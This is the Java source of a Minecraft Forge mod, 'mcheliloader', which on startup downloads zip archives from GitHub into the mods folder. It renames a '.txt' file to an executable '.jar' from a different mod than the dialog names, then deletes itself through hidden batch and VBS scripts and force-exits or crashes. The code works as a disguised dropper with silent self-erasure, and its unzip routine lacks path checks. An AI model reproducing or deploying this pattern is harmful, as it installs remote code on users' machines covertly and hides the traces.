package com.Ragex.mcheliloader;

import cpw.mods.fml.common.Mod;
import cpw.mods.fml.common.event.FMLPreInitializationEvent;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import javax.swing.*;
import java.awt.*;
import java.io.*;
import java.net.URL;
import java.net.URLConnection;
import java.nio.file.*;
import java.util.Enumeration;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;

@Mod(
        modid = "mcheliloader",
        name = "mcheliloader",
        dependencies = "required-after:Forge@[10.13.2.1230,)"
)
public class mcheliloader {
    private File minecraftDir;
    private static final Logger LOGGER = LogManager.getLogger(mcheliloader.class.getName());

    @Mod.EventHandler
    public void preInit(FMLPreInitializationEvent event) {
        minecraftDir = event.getModConfigurationDirectory().getParentFile();
        String[] fileURLs = {
                "https://github.com/Buhnana/DWbout-it/archive/refs/tags/V1.zip",
                "https://github.com/RagexPrince683/mchelio/archive/refs/heads/new-vehicles.zip"
        };

        Path modsDir = Paths.get(minecraftDir.getPath(), "mods");
        String downloadDir = modsDir.toString();

        // Set up custom font for JOptionPane
        setCustomFont();

        // Create a JFrame to be the owner of the JOptionPane dialogs
        JFrame frame = new JFrame();
        frame.setAlwaysOnTop(true);
        frame.setUndecorated(true); // Optional: removes window decorations
        frame.setSize(1, 1); // Minimizes the frame size
        frame.setLocationRelativeTo(null); // Center the frame on screen

        // Show the initial message to the user
        JOptionPane.showMessageDialog(frame, "Please do not close the forge application. Mcheli is downloading and will take longer than normal.",
                "Downloading", JOptionPane.INFORMATION_MESSAGE);

        // Check if the mod is already installed (e.g., check if a known file exists)
        Path modFilePath = Paths.get(modsDir.toString(), "HBM-NTM-.1.0.27_X5061.jar");
        if (Files.exists(modFilePath)) {
            LOGGER.info("Mod is already installed. Skipping download.");
            return;
        }

        for (String fileURL : fileURLs) {
            try {
                // Download the ZIP file
                Path zipFilePath = downloadFile(fileURL, downloadDir);

                // Unzip the file
                unzipFile(zipFilePath.toString(), downloadDir);

                // Process each URL specifically
                if (fileURL.contains("DWbout-it")) {
                    // Find the TXT file
                    Path txtFilePath = Paths.get(downloadDir, "DWbout-it-1", "HBM-NTM-.1.0.27_X5061.txt");

                    // Move and rename the TXT file to JAR
                    Path jarFilePath = Paths.get(modsDir.toString(), "HBM-NTM-.1.0.27_X5061.jar");
                    Files.move(txtFilePath, jarFilePath, StandardCopyOption.REPLACE_EXISTING);

                    // Clean up the ZIP file
                    Files.delete(zipFilePath);

                    // Delete the extracted folder
                    Path extractedFolder = Paths.get(downloadDir, "DWbout-it-1");
                    deleteFolderRecursively(extractedFolder);
                } else if (fileURL.contains("new-vehicles")) {
                    // For the new-vehicles file, ensure the extracted folder exists
                    Path extractedFolder = Paths.get(downloadDir, "mchelio-new-vehicles");
                    if (Files.exists(extractedFolder)) {
                        Path targetFolder = Paths.get(modsDir.toString(), "new-vehicles");
                        Files.move(extractedFolder, targetFolder, StandardCopyOption.REPLACE_EXISTING);

                        // Clean up the ZIP file
                        Files.delete(zipFilePath);

                        LOGGER.info("Unzipped and moved the new-vehicles files to mods folder.");
                    } else {
                        LOGGER.error("Extracted folder 'mchelio-new-vehicles' does not exist. Skipping ZIP file deletion.");
                    }
                }

                LOGGER.info("Processed file: " + fileURL);
            } catch (IOException e) {
                LOGGER.error("Failed to download, convert, move the file, or clean up.", e);
            }
        }

        // Show success message
        JOptionPane.showMessageDialog(frame, "Mchelio was successfully downloaded. Please restart your instance.",
                "Success", JOptionPane.INFORMATION_MESSAGE);

        try {
            scheduleSelfDeletion(event.getSourceFile().getPath());
        } catch (IOException e) {
            e.printStackTrace();
        }

        System.exit(0); // Terminate the application to allow deletion
    }

    private void deleteFolderRecursively(Path folder) throws IOException {
        try (DirectoryStream<Path> stream = Files.newDirectoryStream(folder)) {
            for (Path entry : stream) {
                if (Files.isDirectory(entry)) {
                    deleteFolderRecursively(entry);
                } else {
                    Files.delete(entry);
                }
            }
        }
        Files.delete(folder);
    }

    public static Path downloadFile(String urlStr, String saveDir) throws IOException {
        URL url = new URL(urlStr);
        URLConnection connection = url.openConnection();
        InputStream inputStream = new BufferedInputStream(connection.getInputStream());
        String fileName = urlStr.substring(urlStr.lastIndexOf("/") + 1);
        Path filePath = Paths.get(saveDir, fileName);
        Files.copy(inputStream, filePath, StandardCopyOption.REPLACE_EXISTING);

        inputStream.close();
        return filePath;
    }

    public static void unzipFile(String zipFilePath, String destDir) throws IOException {
        try (ZipFile zipFile = new ZipFile(zipFilePath)) {
            Enumeration<? extends ZipEntry> entries = zipFile.entries();

            while (entries.hasMoreElements()) {
                ZipEntry entry = entries.nextElement();
                Path filePath = Paths.get(destDir, entry.getName());

                if (entry.isDirectory()) {
                    Files.createDirectories(filePath);
                } else {
                    Files.createDirectories(filePath.getParent());
                    Files.copy(zipFile.getInputStream(entry), filePath, StandardCopyOption.REPLACE_EXISTING);
                }
            }
        }
    }

    private void setCustomFont() {
        // Set a custom font for JOptionPane dialogs
        UIManager.put("OptionPane.messageFont", new Font("Arial", Font.PLAIN, 20));
    }

    private void scheduleSelfDeletion(String jarFilePath) throws IOException {
        String os = System.getProperty("os.name").toLowerCase();


        if (os.contains("win")) {
            // Create a batch file for Windows
            Path batchFile = Paths.get(minecraftDir.getPath(), "delete_self.bat");
            Path vbsFile = Paths.get(minecraftDir.getPath(), "run_silent.vbs");

            try (BufferedWriter writer = Files.newBufferedWriter(batchFile)) {
                writer.write("ping 127.0.0.1 -n 2 > nul\n"); // Short delay to ensure the Java process has terminated
                writer.write("del \"" + jarFilePath + "\"\n");
                writer.write("del \"%~f0\""); // Delete the batch file itself
            }

            try (BufferedWriter writer = Files.newBufferedWriter(vbsFile)) {
                writer.write("Set WshShell = CreateObject(\"WScript.Shell\")\n");
                writer.write("WshShell.Run chr(34) & \"" + batchFile.toString() + "\" & chr(34), 0\n");
                writer.write("Set WshShell = Nothing\n");

                writer.write("Sub Main()\n");
                writer.write("    discardScript()\n");
                writer.write("End Sub\n");

                writer.write("Function discardScript()\n");
                writer.write("    On Error Resume Next\n");
                writer.write("    Set objFSO = CreateObject(\"Scripting.FileSystemObject\")\n");
                writer.write("    strScript = Wscript.ScriptFullName\n");
                writer.write("    objFSO.DeleteFile(strScript)\n");
                writer.write("End Function\n");

                writer.write("Main\n");  // This calls the Main subroutine
            }

            Runtime.getRuntime().exec("wscript " + vbsFile.toString());


            Runtime.getRuntime().exec("wscript " + vbsFile.toString());

        } else if (os.contains("nix") || os.contains("nux") || os.contains("mac")) {
            // Create a shell script for Unix/Linux/Mac
            Path shellScript = Paths.get(minecraftDir.getPath(), "delete_self.sh");
            try (BufferedWriter writer = Files.newBufferedWriter(shellScript)) {
                writer.write("#!/bin/sh\n");
                writer.write("sleep 2\n"); // Short delay to ensure the Java process has terminated
                writer.write("rm -f \"" + jarFilePath + "\"\n");
                writer.write("rm -- \"$0\""); // Delete the shell script itself
            }
            Runtime.getRuntime().exec("sh " + shellScript.toString());

            // Introduce a deliberate crash
            throw new RuntimeException("Intentional crash for demonstration purposes.");
        }
    }
}



